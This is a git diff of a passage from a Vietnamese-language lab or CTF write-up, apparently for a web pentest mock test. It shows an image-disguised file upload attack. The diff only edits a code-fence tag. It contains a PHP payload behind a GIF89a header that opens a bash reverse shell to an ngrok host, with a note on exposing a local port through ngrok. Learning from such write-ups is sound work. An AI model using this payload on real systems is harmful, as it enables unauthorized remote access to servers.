@@ -160,10 +160,11 @@ Cuối cùng, ta truy cập vào `upload/4762991e1201cbcb.php` trên host `https
 
 Khi đã biết thư mục `upload` cho phép thực thi mã `PHP`, ta có thể tạo một tệp giả mạo hình ảnh (ví dụ `.gif`) nhưng thực chất chứa mã độc để thiết lập `reverse shell`.
 
-```bash php
+```
 GIF89a
 <?php system('bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/YOUR_PORT 0>&1"'); ?>
 ```
+
 Ta sử dụng `ngrok` để công khai một cổng TCP trên máy local ra Internet.
 
 ![image](/assets/images/WPT/cbjs-mock-test/image15.png)
